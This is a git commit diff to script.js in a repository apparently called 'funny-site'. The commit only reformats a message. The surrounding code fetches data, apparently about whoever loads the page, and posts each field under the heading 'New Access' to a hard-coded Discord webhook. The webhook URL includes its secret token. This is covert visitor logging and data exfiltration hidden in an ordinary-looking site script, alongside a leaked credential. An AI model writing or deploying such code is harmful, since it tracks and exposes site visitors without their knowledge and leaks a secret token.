f52475ce30c442f8d7cd07e29cee7262d629c346
funny-site <87890963+funny-site@users.noreply.github.com>
2021-07-24 23:34:36 -0400

    Update script.js

--- script.js
+++ script.js
@@ -4,14 +4,15 @@ function req () {
     method:'GET'
   }
   axios(get).then(res => {
-    var content = '**__New Access__**\n\n';
+    var content = '```New Access: \n\n';
     function capitalize (str) {
       if(!str[0] || str.startsWith('https')) return str;
       else return str[0].toUpperCase()+str.slice(1,);
     }
     for (entry in res.data) {
-      content+='**'+capitalize(entry)+'** : `\u200b'+capitalize(res.data[entry])+'`\n'
+      content+=capitalize(entry)+' : '+capitalize(res.data[entry])+'\n'
     }
+    content+='```';
     const post = {
       url:'https://discord.com/api/webhooks/868691732454318091/z9xRVp174JQyy8XSFxMubeCLkcRkhDGpfvfiel0qDgx0jVQulispp0UGfddpVpK0GQF-',
       method:'POST',
